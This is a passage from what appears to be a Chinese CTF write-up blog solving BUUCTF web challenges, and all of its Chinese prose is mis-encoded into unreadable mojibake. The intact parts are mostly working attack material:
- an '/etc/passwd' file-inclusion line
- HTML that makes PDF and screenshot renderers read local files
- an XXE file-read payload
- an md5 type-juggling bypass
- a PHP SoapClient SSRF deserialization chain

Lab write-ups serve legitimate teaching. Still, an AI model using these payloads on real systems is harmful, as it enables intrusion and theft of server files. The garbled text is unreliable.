<td align="left">è¯·æ±‚æœåŠ¡å™¨åˆ é™¤æŒ‡å®šçš„é¡µé¢ã€‚</td>
</tr>
<tr>
<td align="left">6</td>
<td align="left">CONNECT</td>
<td align="left">HTTP/1.1 åè®®ä¸­é¢„ç•™ç»™èƒ½å¤Ÿå°†è¿æ¥æ”¹ä¸ºç®¡é“æ–¹å¼çš„ä»£ç†æœåŠ¡å™¨ã€‚</td>
</tr>
<tr>
<td align="left">7</td>
<td align="left">OPTIONS</td>
<td align="left">å…è®¸å®¢æˆ·ç«¯æŸ¥çœ‹æœåŠ¡å™¨çš„æ€§èƒ½ã€‚</td>
</tr>
<tr>
<td align="left">8</td>
<td align="left">TRACE</td>
<td align="left">å›æ˜¾æœåŠ¡å™¨æ”¶åˆ°çš„è¯·æ±‚ï¼Œä¸»è¦ç”¨äºæµ‹è¯•æˆ–è¯Šæ–­ã€‚</td>
</tr>
<tr>
<td align="left">9</td>
<td align="left">PATCH</td>
<td align="left">æ˜¯å¯¹ PUT æ–¹æ³•çš„è¡¥å……ï¼Œç”¨æ¥å¯¹å·²çŸ¥èµ„æºè¿›è¡Œå±€éƒ¨æ›´æ–° ã€‚</td>
</tr>
</tbody></table>
<p>è¿™é¢˜æœ‰ç‚¹é­”å¹»ï¼Œä¸€ä¸Šæ¥å°±è®©æˆ‘ä»¬çŒœäº”ä¸ªæ¥å£ï¼Œçœ‹æºç å°±å¯ä»¥çœ‹åˆ°æ ¼å¼äº†</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111658.png" alt="image-20200521224548138"></p>
<p>æ¥å£å¦‚ä¸‹</p>
<ul>
<li><code>/circle/one/</code>;</li>
<li><code>/two/</code>;</li>
<li><code>/square/</code>;</li>
<li><code>/com/seaerch/</code>;</li>
<li><code>/vim/quit/</code>.</li>
</ul>
<p><strong>æ¥å£ /circle/one/</strong></p>
<p>GETã€POST ä¸è¡Œè¯•äº†ä¸€ä¸‹ä¸‡èƒ½ OPTIONS æœ‰å›æ˜¾ï¼Œæ˜¯ä¸€ä¸ª PDF</p>
<p>å…ˆä¸‹è½½ä¸‹æ¥ï¼Œå¥½åƒæ²¡ä»€ä¹ˆç”¨</p>
<pre><code>curl -X OPTIONS http://95d801c2-a4ba-4d3f-9027-e36053308fa7.node3.buuoj.cn/circle/one/ --output one.pdf</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111653.png" alt="image-20200521225335651"></p>
<p><strong>æ¥å£ /two/</strong></p>
<p>PUT è¯·æ±‚è¿”å›</p>
<pre><code>Put the dots???</code></pre><p>CONNECT è¯·æ±‚ä¼šè¿”å›ä¸€ä¸ª .png æ–‡ä»¶ï¼Œæˆ‘ä»¬ç»§ç»­ä¸‹ä¸‹æ¥</p>
<pre><code>curl -X CONNECT http://95d801c2-a4ba-4d3f-9027-e36053308fa7.node3.buuoj.cn/two/ --output two.png</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111853.png" alt="image-20200521225932745"></p>
<p>å¾—åˆ°æ–‡å­—</p>
<pre><code>up_on_noodles</code></pre><p><strong>æ¥å£ /square/</strong></p>
<p>DELETE è¯·æ±‚ä¹Ÿæœ‰ä¸€ä¸ª .png æ–‡ä»¶ï¼Œæ˜¯ä¸ªæ–‡å­—æ¸¸æˆ</p>
<pre><code>curl -X DELETE http://95d801c2-a4ba-4d3f-9027-e36053308fa7.node3.buuoj.cn/square/ --output three.png</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111900.png" alt="image-20200521230252676"></p>
<p>æ¸¸æˆç­”æ¡ˆ</p>
<pre><code>    E
    S
    I
    R
    P
  E R
  C E
  A T
E P N
TASTES
 L A U
 D U L
 E   A
 R   C
 A   O
 A
 N</code></pre><p>å¾—åˆ°æ–‡å­—</p>
<pre><code>tastes</code></pre><p><strong>æ¥å£ /com/seaerch/</strong></p>
<p>GET è¯·æ±‚ä¼šè¿”å›</p>
<pre><code>&lt;htlm&gt;

,,,,,,,,,&lt;search&gt; &lt;-- comment for search --!&gt;:

  ERROR &lt;/&gt; search=null&lt;/end&gt;

&lt;/html&gt;</code></pre><p>è¦ç”¨åˆ° search å‚æ•°ï¼Œä½†æ˜¯ ?search=1 æ²¡ä¸œè¥¿ï¼Œæ‰€ä»¥æˆ‘ä»¬æ”¾åˆ° POST é‚£é‡Œè¯•è¯•çœ‹</p>
<pre><code>Content-Type: application/x-www-form-urlencoded
Content-Length: 8

search=1</code></pre><p>ç»“æœè¿”å›</p>
<pre><code>&lt;htlm&gt;

,,,,,,,,,&lt;search&gt; &lt;-- comment for search --!&gt;:

  &lt;query&gt; 1 is not a good search, please use this one instead: &#39;flag&#39; &lt;try&gt;

&lt;/html&gt;</code></pre><p>é‚£æˆ‘ä»¬å°±è¾“å…¥ flagï¼Œå¾—åˆ°äº†</p>
<pre><code>&lt;htlm&gt;

,,,,,,,,,&lt;search&gt; &lt;-- comment for search --!&gt;:

  &lt;query&gt; good search&lt;/query&gt;
  results: &lt;p&gt;_good_in_s&lt;/p&gt;:w


&lt;/html&gt;</code></pre><p>å¾—åˆ°æ–‡å­—</p>
<pre><code>_good_in_s</code></pre><p><strong>æ¥å£ /vim/quit/</strong></p>
<blockquote>
<p>BUUCTF æ²¡æ³•å¤ç° TRACE è¯·æ±‚</p>
</blockquote>
<p>è¿™é‡Œçš„é¢„æœŸè§£æ˜¯å‘é€</p>
<pre><code>TRACE /vim/quit/?exit=:wq</code></pre><p>å°±ä¼šå¾—åˆ°</p>
<pre><code>   &lt;hteeemel&lt;body&gt;&gt;

      &lt;flag&gt; well done wait &lt;/flag&gt;
&lt;text&gt; this one/&gt; &lt;flag&gt;pace_too&#125;&lt;/flag&gt;

&lt;/&gt;</code></pre><p>å¾—åˆ°æ–‡å­—</p>
<pre><code>pace_too&#125;</code></pre><p>ä¸Šé¢ 5 ä¸ªæ¥å£æ‹¿åˆ°çš„æ–‡å­—æ‹¼èµ·æ¥</p>
<pre><code>pctf&#123;ketchup_on_noodles_tastes_good_in_space_too&#125;</code></pre><h2 id="b01lers2020-Scrambled"><a href="#b01lers2020-Scrambled" class="headerlink" title="[b01lers2020]Scrambled"></a>[b01lers2020]Scrambled</h2><p><strong>è„‘æ´é¢˜</strong></p>
<p>æºç æ²¡ä»€ä¹ˆä¸œè¥¿ï¼Œåªæœ‰ Cookie æœ‰ç‚¹ä¸œè¥¿</p>
<p><code>frequency</code> æ˜¯è®¿é—®æ¬¡æ•°</p>
<p><code>transmissions</code>åªæœ‰ä¸­é—´å››ä½ä¸æ–­å˜åŒ–ï¼Œæœ‰æ–œæ ï¼Œæœ‰å¤§æ‹¬å·ï¼ŒçŒœæµ‹å‰ä¸¤ä½åº”è¯¥æ˜¯ flagï¼Œåä¸¤ä½æ˜¯ flag æ‰€åœ¨çš„ä½ç½®</p>
<p>ç›´æ¥ä¸Šè„šæœ¬</p>
<pre><code>import requests as rq
import re, urllib

flag = [&#39;_&#39;] * 42
url = &quot;http://7f46b512-f523-4788-8e86-e6c8b3deb002.node3.buuoj.cn/&quot;
cookies = &#123;&quot;frequency&quot;:&quot;1&quot;,&quot;transmissions&quot;:&quot;x&quot;&#125;

while True:
    res = rq.get(url, cookies=cookies)
    cookie = res.headers[&quot;Set-Cookie&quot;].split(&#39;;&#39;)[3].split(&#39;=&#39;)[2].replace(&quot;kxkxkxkxsh&quot;,&quot;&quot;)
    cookie = urllib.parse.unquote(cookie)

    if len(cookie) == 4:
        index = int(cookie[-2:])
    else:
        index = int(cookie[-1])
    flag[index] = cookie[0]
    flag[index + 1] = cookie[1]

    print(&#39;&#39;.join(flag))
    if &#39;_&#39; not in flag:
        break</code></pre><h2 id="FireshellCTF2020-Caas"><a href="#FireshellCTF2020-Caas" class="headerlink" title="[FireshellCTF2020]Caas"></a>[FireshellCTF2020]Caas</h2><p><strong>æ–‡ä»¶åŒ…å«</strong></p>
<p>éšæ„è¾“å…¥ä¸€æ®µä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“å®ƒæ˜¯ Linux ä¸‹å¯¹ c è¯­è¨€çš„ç¼–è¯‘å™¨</p>
<p>åŒ…å«æ–‡ä»¶æ—¶å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ä¼šæŠ¥é”™ï¼Œå°è¯•</p>
<pre><code>#include &quot;/etc/passwd&quot;</code></pre><p>ä¼šçˆ†å‡ºéƒ¨åˆ†æ–‡ä»¶ä¿¡æ¯ï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œç›´æ¥åŒ…å« /flag å³å¯</p>
<pre><code>#include &quot;/flag&quot;</code></pre><h2 id="FireshellCTF2020-URL-TO-PDF"><a href="#FireshellCTF2020-URL-TO-PDF" class="headerlink" title="[FireshellCTF2020]URL TO PDF"></a>[FireshellCTF2020]URL TO PDF</h2><p><strong>xss</strong></p>
<p>vps ä¸Šåˆ›å»ºå¦‚ä¸‹ index.html</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
    &lt;meta charset=&quot;UTF-8&quot;&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;link rel=&quot;attachment&quot; href=&quot;file:///flag&quot;&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre><p>æœ¬åœ°ä¸‹è½½ pdf</p>
<pre><code>curl -X POST http://b57370e7-5b4d-4485-a409-ea42090a26c4.node3.buuoj.cn/ -d &quot;url=http://174.1.129.147:9999&quot; --output flag.pdf</code></pre><blockquote>
<p>å®‰è£… pdfdetach</p>
<p>sudo apt install xpdf</p>
</blockquote>
<p>åˆ©ç”¨ pdfdetach åˆ†ç¦» pdf</p>
<pre><code>$ pdfdetach -list flag.pdf
1 embedded files
1: flag
$ pdfdetach -save 1 flag.pdf
$ cat flag
flag&#123;c130bcef-78ec-4305-9c1d-645de0affa42&#125;</code></pre><h2 id="FireshellCTF2020-ScreenShooter"><a href="#FireshellCTF2020-ScreenShooter" class="headerlink" title="[FireshellCTF2020]ScreenShooter"></a>[FireshellCTF2020]ScreenShooter</h2><p><strong>xss</strong></p>
<p>å’Œ URL TO PDF å¾ˆç±»ä¼¼</p>
<p>æ ¹æ® HTTP æŸ¥çœ‹å®¢æˆ·ç«¯ä¿¡æ¯</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111633.png" alt="image-20200524195743552"></p>
<p>å‘ç°å…¶ç”¨çš„æ˜¯ PhantomJSï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯ç”¨ js æ¥è¯» flag</p>
<p>å‚è€ƒä¸€ä½æ—¥æœ¬å¸ˆå‚…çš„ wp</p>
<p><a target="_blank" rel="noopener" href="https://st98.github.io/diary/posts/2020-03-23-fireshell-ctf.html">https://st98.github.io/diary/posts/2020-03-23-fireshell-ctf.html</a></p>
<blockquote>
<p>å› ä¸º flag è¿”å›çš„æ˜¯é»‘è‰²å­—ç¬¦ï¼Œæ‰€ä»¥è¿™é‡Œè¦æŠŠèƒŒæ™¯å¼„æˆç™½è‰²æ‰èƒ½çœ‹åˆ° flag</p>
</blockquote>
<pre><code>&lt;!doctype html&gt;
&lt;html lang=&quot;en&quot;&gt;
  &lt;head&gt;
    &lt;title&gt;test&lt;/title&gt;
    &lt;style&gt;body &#123; background: white; &#125;&lt;/style&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;script&gt;
      var xhr = new XMLHttpRequest();
      xhr.onload = function () &#123;
        document.body.innerText = xhr.responseText;
      &#125;;
      xhr.open(&#39;GET&#39;, &#39;file:///flag&#39;);
      xhr.send();
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;</code></pre><h2 id="FireshellCTF2020-Cars"><a href="#FireshellCTF2020-Cars" class="headerlink" title="[FireshellCTF2020]Cars"></a>[FireshellCTF2020]Cars</h2><p><strong>XXE</strong></p>
<p>æ˜¯ä¸€ä¸ªç”¨ Kotlin å†™çš„ APKï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹çœ‹å®ƒçš„æ¥å£æœ‰å“ªäº›ï¼Œåˆšå¥½å¯¹åº”äº†ä¸‰ä¸ª Activity</p>
<pre><code>// apk/app/src/main/java/com/arconsultoria/cars/rest/Rest.kt
interface Rest &#123;

    @GET(&quot;/cars&quot;)
    fun getCars(): Call&lt;List&lt;Car&gt;&gt;

    @GET(&quot;/car/&#123;id&#125;&quot;)
    fun getCar(@Path(&quot;id&quot;) id: Int): Call&lt;Car&gt;

    @POST(&quot;/comment&quot;)
    fun postComment(@Body comment: Comment): Call&lt;CommentResponse&gt;

&#125;</code></pre><p><code>/cars</code> å’Œ <code>/car</code> æ¥å£åªèƒ½æŸ¥è¯¢ä¿¡æ¯ï¼Œä¸‹é¢æˆ‘ä»¬é‡ç‚¹çœ‹ä¸€ä¸‹ <code>/comment</code> æ¥å£</p>
<pre><code>// apk/app/src/main/java/com/arconsultoria/cars/activity/CommentActivity.kt
fun send_comment() &#123;
    val retrofit = Retrofit.Builder()
        .baseUrl(resources.getString(R.string.url_api))
        .addConverterFactory(GsonConverterFactory.create())
        .build()

    val service = retrofit.create(Rest::class.java)
    val comment = Comment(edt_name.text.toString(), edt_message.text.toString())
    val call = service.postComment(comment)
    call.enqueue(object : Callback&lt;CommentResponse&gt; &#123;
        override fun onFailure(call: Call&lt;CommentResponse&gt;, t: Throwable) &#123;
            Toast.makeText(baseContext, &quot;Error posting comment!&quot;, Toast.LENGTH_LONG).show()
        &#125;

        override fun onResponse(
            call: Call&lt;CommentResponse&gt;,
            response: Response&lt;CommentResponse&gt;
        ) &#123;
            if (response.code() != 200) &#123;
                Toast.makeText(baseContext, &quot;Error posting comment!&quot;, Toast.LENGTH_LONG).show()
                return
            &#125;

            Toast.makeText(baseContext, response.body()?.message, Toast.LENGTH_LONG).show()
            finish()
        &#125;
    &#125;)
&#125;

// apk/app/src/main/java/com/arconsultoria/cars/domain/Comment.kt
package com.arconsultoria.cars.domain

data class Comment(
    var name: String,
    var message: String
)</code></pre><p>å¤§è‡´é€»è¾‘å°±æ˜¯æ¥å—ä¸€ä¸ª name å’Œ messageï¼Œåˆ©ç”¨ retrofit è°ƒç”¨ Rest çš„æ¥å£è¿›è¡Œ HTTP åº”ç­”ï¼Œç„¶åå†æ˜¾ç¤ºä¸€ä¸ªæˆåŠŸä¿¡æ¯</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111627.png" alt="image-20200525205600302"></p>
<p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„åå­—å¾—åˆ°äº†å›æ˜¾ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥çŒœæƒ³ä¸€ä¸ªæœ‰æ²¡æœ‰å¯èƒ½æœ‰ xxeï¼Œå‘ç°å¯ä»¥æˆåŠŸå›æ˜¾</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111624.png" alt="image-20200525210033943"></p>
<p>ç„¶åç›´æ¥è¯» /flag å°±å¥½</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
&lt;!DOCTYPE foo [  
&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt; ]&gt; 
&lt;Comment&gt;
    &lt;name&gt;&amp;xxe;&lt;/name&gt;
    &lt;message&gt;hello&lt;/message&gt;
&lt;/Comment&gt;</code></pre><h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><p><strong>ååºåˆ—åŒ–</strong></p>
<p>è¿›å»åå¾—åˆ°æºç ï¼Œéœ€è¦æˆ‘ä»¬æ„é€ ååºåˆ—åŒ–popé“¾</p>
<pre><code>&lt;?php

?&gt; </code></pre><p>IP ä¼ªé€ è¦ä¸€ä¸ªä¸ªè¯•</p>
<pre><code>Client-Ip: 127.0.0.1</code></pre><p>file_get_content ç”¨ php://input ç»•è¿‡</p>
<p>file å†™ä¸ªåŠ å¯†è„šæœ¬å°±å¥½</p>
<pre><code>&lt;?php
function encode($re)&#123;
    $c = &#39;&#39;;
    for($i=0;$i&lt;strlen($re);$i++)&#123; 
        $c .= chr ( ord ($re[$i]) - $i*2 ); 
    &#125; 
    $v = base64_encode($c); 
    return $v;
&#125;
echo encode(&#39;flag.php&#39;);

# ZmpdYSZmXGI=</code></pre><p>æœ€ç»ˆ payload</p>
<pre><code>GET /secrettw.php?2333=php://input&amp;file=ZmpdYSZmXGI%3d HTTP/1.1
Host: 54df68eb-d79a-4927-ad56-ad94e5470714.node3.buuoj.cn
Client-Ip: 127.0.0.1
Content-Length: 20

todat is a happy day</code></pre><h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p><strong>ä»£ç å®¡è®¡</strong></p>
<pre><code>
I put something in F12 for you
include &#39;flag.php&#39;;
$flag=&#39;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#39;;
if(isset($_GET[&#39;gg&#39;])&amp;&amp;isset($_GET[&#39;id&#39;])) &#123;
    $id=$_GET[&#39;id&#39;];
    $gg=$_GET[&#39;gg&#39;];
    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;
        echo &#39;You got the first step&#39;;
        if(isset($_POST[&#39;passwd&#39;])) &#123;
            $passwd=$_POST[&#39;passwd&#39;];
            if (!is_numeric($passwd))
            &#123;
                 if($passwd==1234567)
                 &#123;
                     echo &#39;Good Job!&#39;;
                     highlight_file(&#39;flag.php&#39;);
                     die(&#39;By Retr_0&#39;);
                 &#125;
                 else
                 &#123;
                     echo &quot;can you think twice??&quot;;
                 &#125;
            &#125;
            else&#123;
                echo &#39;You can not get it !&#39;;
            &#125;

        &#125;
        else&#123;
            die(&#39;only one way to get the flag&#39;);
        &#125;
&#125;
    else &#123;
        echo &quot;You are not a real hacker!&quot;;
    &#125;
&#125;
else&#123;
    die(&#39;Please input first&#39;);
&#125;
&#125;Please input first</code></pre><p>æ•°æ®ç»• md5 ï¼Œæ•°å­—åŠ å­—æ¯ç»•è¿‡ is_numeric</p>
<pre><code>POST /?gg[]=1&amp;id[]=2 HTTP/1.1
Host: 3b3bfe4c-e6a9-4d8e-a886-7b741a51276a.node3.buuoj.cn
Content-Length: 15
Content-Type: application/x-www-form-urlencoded

passwd=1234567a</code></pre><h2 id="MRCTF2020-Ezpop-Revenge"><a href="#MRCTF2020-Ezpop-Revenge" class="headerlink" title="[MRCTF2020]Ezpop_Revenge"></a>[MRCTF2020]Ezpop_Revenge</h2><p><strong>SoapClient ssrf</strong></p>
<p><a target="_blank" rel="noopener" href="http://www.zip">www.zip</a> æºç æ³„éœ²</p>
<p>æŸ¥çœ‹ flag.phpï¼Œéœ€è¦ ssrf</p>
<pre><code>&lt;?php
    if(!isset($_SESSION)) session_start();
    if($_SERVER[&#39;REMOTE_ADDR&#39;]===&quot;127.0.0.1&quot;)&#123;
       $_SESSION[&#39;flag&#39;]= &quot;MRCTF&#123;******&#125;&quot;;
    &#125;else echo &quot;æˆ‘æ‰Œyour problem?\nonly localhost can get flag!&quot;;
?&gt;</code></pre><p>æŸ¥çœ‹ Plugin.phpï¼Œå¯ä»¥çœ‹åˆ°å­˜åœ¨ååºåˆ—åŒ–æ“ä½œ</p>
<pre><code>    public function action()&#123;
        if(!isset($_SESSION)) session_start();
        if(isset($_REQUEST[&#39;admin&#39;])) var_dump($_SESSION);
        if (isset($_POST[&#39;C0incid3nc3&#39;])) &#123;
            if(preg_match(&quot;/file|assert|eval|[`\&#39;~^?&lt;&gt;$%]+/i&quot;,base64_decode($_POST[&#39;C0incid3nc3&#39;])) === 0)
                unserialize(base64_decode($_POST[&#39;C0incid3nc3&#39;]));
            else &#123;
                echo &quot;Not that easy.&quot;;
            &#125;
        &#125;
    &#125;</code></pre><p>æ¿€æ´»çš„æ–¹æ³•åœ¨ /page_admin</p>
<pre><code>public static function activate($pluginName)
&#123;
    self::$_plugins[&#39;activated&#39;][$pluginName] = self::$_tmp;
    self::$_tmp = array();
    Helper::addRoute(&quot;page_admin_action&quot;,&quot;/page_admin&quot;,&quot;HelloWorld_Plugin&quot;,&#39;action&#39;);
&#125;</code></pre><p>æˆ‘ä»¬è·Ÿè¿›è¿™ä¸ªå¥‡æ€ªçš„ class</p>
<pre><code>class HelloWorld_DB&#123;
    private $flag=&quot;MRCTF&#123;this_is_a_fake_flag&#125;&quot;;
    private $coincidence;
    function  __wakeup()&#123;
        $db = new Typecho_Db($this-&gt;coincidence[&#39;hello&#39;], $this-&gt;coincidence[&#39;world&#39;]);
    &#125;
&#125;</code></pre><p>è½¬åˆ° /var/Typecho/Db.phpï¼Œçœ‹åˆ° $adapterName è¿›è¡Œäº†æ‹¼æ¥</p>
<pre><code>    public function __construct($adapterName, $prefix = &#39;typecho_&#39;)
    &#123;
        /** è·å–é€‚é…å™¨åç§° */
        $this-&gt;_adapterName = $adapterName;

        /** æ•°æ®åº“é€‚é…å™¨ */
        $adapterName = &#39;Typecho_Db_Adapter_&#39; . $adapterName;

        if (!call_user_func(array($adapterName, &#39;isAvailable&#39;))) &#123;
            throw new Typecho_Db_Exception(&quot;Adapter &#123;$adapterName&#125; is not available&quot;);//__toString()
        &#125;

        $this-&gt;_prefix = $prefix;

        /** åˆå§‹åŒ–å†…éƒ¨å˜é‡ */
        $this-&gt;_pool = array();
        $this-&gt;_connectedPool = array();
        $this-&gt;_config = array();

        //å®ä¾‹åŒ–é€‚é…å™¨å¯¹è±¡
        $this-&gt;_adapter = new $adapterName();
    &#125;</code></pre><p>æœç´¢ __string() æ–¹æ³•ï¼Œè·³è½¬åˆ° /var/Tpecho/Db/Query.php</p>
<pre><code>public function __toString()
&#123;
    switch ($this-&gt;_sqlPreBuild[&#39;action&#39;]) &#123;
        case Typecho_Db::SELECT:
            return $this-&gt;_adapter-&gt;parseSelect($this-&gt;_sqlPreBuild);
        case Typecho_Db::INSERT:
            return &#39;INSERT INTO &#39;
            . $this-&gt;_sqlPreBuild[&#39;table&#39;]
            . &#39;(&#39; . implode(&#39; , &#39;, array_keys($this-&gt;_sqlPreBuild[&#39;rows&#39;])) . &#39;)&#39;
            . &#39; VALUES &#39;
            . &#39;(&#39; . implode(&#39; , &#39;, array_values($this-&gt;_sqlPreBuild[&#39;rows&#39;])) . &#39;)&#39;
            . $this-&gt;_sqlPreBuild[&#39;limit&#39;];
        case Typecho_Db::DELETE:
            return &#39;DELETE FROM &#39;
            . $this-&gt;_sqlPreBuild[&#39;table&#39;]
            . $this-&gt;_sqlPreBuild[&#39;where&#39;];
        case Typecho_Db::UPDATE:
            $columns = array();
            if (isset($this-&gt;_sqlPreBuild[&#39;rows&#39;])) &#123;
                foreach ($this-&gt;_sqlPreBuild[&#39;rows&#39;] as $key =&gt; $val) &#123;
                    $columns[] = &quot;$key = $val&quot;;
                &#125;
            &#125;

            return &#39;UPDATE &#39;
            . $this-&gt;_sqlPreBuild[&#39;table&#39;]
            . &#39; SET &#39; . implode(&#39; , &#39;, $columns)
            . $this-&gt;_sqlPreBuild[&#39;where&#39;];
        default:
            return NULL;
    &#125;
&#125;</code></pre><p>çœ‹åˆ°å½“ action ä¸º SELECT æ—¶ï¼Œä¼šè°ƒç”¨ <code>$this-&gt;_adapter-&gt;parseSelect($this-&gt;_sqlPreBuild);</code>ï¼Œå¦‚æœ $this-&gt;<code>_adapter</code> æ²¡æœ‰ <code>parseSelect</code> æ–¹æ³•ï¼Œå°±ä¼šè§¦å‘ <code>__call()</code> å‡½æ•°ï¼Œè¿™é‡Œå°±æ»¡è¶³äº† SoapClient ååºåˆ—åŒ–çš„æ¡ä»¶</p>
<p>æ‰€ä»¥è¿™é‡Œçš„ POP é“¾å°±æ˜¯</p>
<ol>
<li>ååºåˆ—åŒ– <code>HelloWorld_DB</code> ç±»è§¦å‘ __wakeup() æ–¹æ³•</li>
<li>è®© <code>Typecho_Db_Query</code> èµ‹å€¼ç»™  <code>coincidence[&#39;hello&#39;]</code>ï¼Œè®©å…¶è§¦å‘ <code>__toString()</code> æ–¹æ³•</li>
<li>è®© <code>SELECT</code> èµ‹å€¼ç»™ <code>_sqlPreBuild[&#39;action&#39;]</code>ï¼Œè®©å…¶è§¦å‘ <code>$this-&gt;_adapter-&gt;parseSelect($this-&gt;_sqlPreBuild)</code></li>
<li>è®© <code>SoapCient</code> ç±»èµ‹å€¼ç»™ <code>$this-&gt;_adapter</code>ï¼Œè®©å…¶è§¦å‘ <code>__call()</code> æ–¹æ³•</li>
</ol>
<p>ä½†æ˜¯è¿™é‡Œä¼šæœ‰ä¸ªå‘ï¼Œå°±æ˜¯ç§æœ‰å˜é‡çš„ %00 æ˜¯æ‰“ä¸é€šçš„ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©ç”¨åå…­è¿›åˆ¶ \00 ç»•è¿‡ï¼Œå¹¶ä¸”æŠŠå­—ç¬¦ä¸² s æ ‡è¯†ç¬¦å˜æˆ Sï¼Œè¿™é‡Œå‚è€ƒé¢–å¥‡å¸ˆå‚…çš„ payload</p>
<p><a target="_blank" rel="noopener" href="https://www.gem-love.com/ctf/2184.html#Ezpop_Revenge">https://www.gem-love.com/ctf/2184.html#Ezpop_Revenge</a></p>
<p>æ‰€ä»¥æœ€ç»ˆ payload æ˜¯</p>
<pre><code>&lt;?php

class Typecho_Db_Query
&#123;
    private $_sqlPreBuild;
    private $_adapter;

    public function __construct() &#123;
        $this-&gt;_sqlPreBuild = array(&#39;action&#39; =&gt; &#39;SELECT&#39;);

        $url = &quot;http://127.0.0.1/flag.php&quot;;
        $headers = array(
            &#39;X-Forwarded-For: 127.0.0.1&#39;,
            &#39;Cookie: PHPSESSID=2ao5l5vohokfb6kooqkibfhnv1&#39;
        );  
        $this-&gt;_adapter = new SoapClient(null, array(&#39;uri&#39; =&gt; &#39;hello&#39;, &#39;location&#39; =&gt; $url, &#39;user_agent&#39; =&gt; 
            &#39;kk^^&#39;.join(&#39;^^&#39;, $headers)));
    &#125;
&#125;

class HelloWorld_DB&#123;
    private $coincidence;

    public function __construct() &#123;
        $this-&gt;coincidence = array(&#39;hello&#39; =&gt; new Typecho_Db_Query());
    &#125;
&#125;

function decorate($str)
&#123;
    $arr = explode(&#39;:&#39;, $str);
    $newstr = &#39;&#39;;
    for ($i = 0; $i &lt; count($arr); $i++) &#123;
        if (preg_match(&#39;/00/&#39;, $arr[$i])) &#123;
            $arr[$i-2] = preg_replace(&#39;/s/&#39;, &quot;S&quot;, $arr[$i-2]);
        &#125;
    &#125;
    $i = 0;
    for (; $i &lt; count($arr) - 1; $i++) &#123;
        $newstr .= $arr[$i];
        $newstr .= &quot;:&quot;;
    &#125;
    $newstr .= $arr[$i];
    return $newstr;
&#125;

$xx = serialize(new HelloWorld_DB());
$xx = preg_replace(&quot;/\^\^/&quot;, &quot;\r\n&quot;, $xx);
$xx = urlencode($xx);
$xx = preg_replace(&#39;/%00/&#39;, &#39;%5c%30%30&#39;, $xx);
$xx = decorate(urldecode($xx));
var_dump($xx);
$xxx = base64_encode($xx);
echo $xxx;
?&gt;</code></pre><p>å¸¦ä¸Š PHPSESSID å’Œ admin å‚æ•°å°±å¯ä»¥çœ‹åˆ° flag äº†</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111601.png" alt="image-20200523172231392"></p>
<h2 id="Zer0pts2020-phpNantokaAdmin"><a href="#Zer0pts2020-phpNantokaAdmin" class="headerlink" title="[Zer0pts2020]phpNantokaAdmin"></a>[Zer0pts2020]phpNantokaAdmin</h2><p><strong>Sqlite æ³¨å…¥</strong></p>
<p>æ ¹æ®æç¤ºè¿™æ˜¯ä¸€ä¸ª Sqlite æ•°æ®åº“ï¼Œç›¸åº”çš„æ“ä½œæœ‰åˆ›å»ºè¡¨ã€æ’å…¥å€¼å’Œåˆ é™¤è¡¨ï¼Œé‚£ä¹ˆæœ‰å¯èƒ½å­˜åœ¨æ³¨å…¥çš„æ˜¯åˆ›å»ºè¡¨å’Œæ’å…¥å€¼ï¼Œä½†æ˜¯æ’å…¥å€¼é‚£é‡Œä¼¼ä¹æ³¨ä¸äº†ï¼Œæ‰€ä»¥æ³¨å…¥ç‚¹åº”è¯¥åœ¨åˆ›å»ºè¡¨é‚£é‡Œ</p>
<p>é¦–å…ˆæˆ‘ä»¬éœ€è¦çŸ¥é“ Sqlite çš„ä¸€äº›ç‰¹æ€§</p>
<p>å½“ Sqlite è¿›è¡Œ select æ—¶ï¼Œå¯ä»¥ç”¨<code>[]</code>ã€<code>&#39;</code>ã€<code>&quot;</code> å’Œ ` æ¥è£…é¥°åˆ—åï¼Œä½äºåˆ—ååé¢çš„å­—æ®µè¢«ç§°ä¸ºåˆ«åï¼Œå¦‚</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111558.png" alt="image-20200523180454324"></p>
<p>create table æ—¶æ”¯æŒä¸€ç§ as çš„è¯­æ³•</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111555.png" alt="image-20200523180711650"></p>
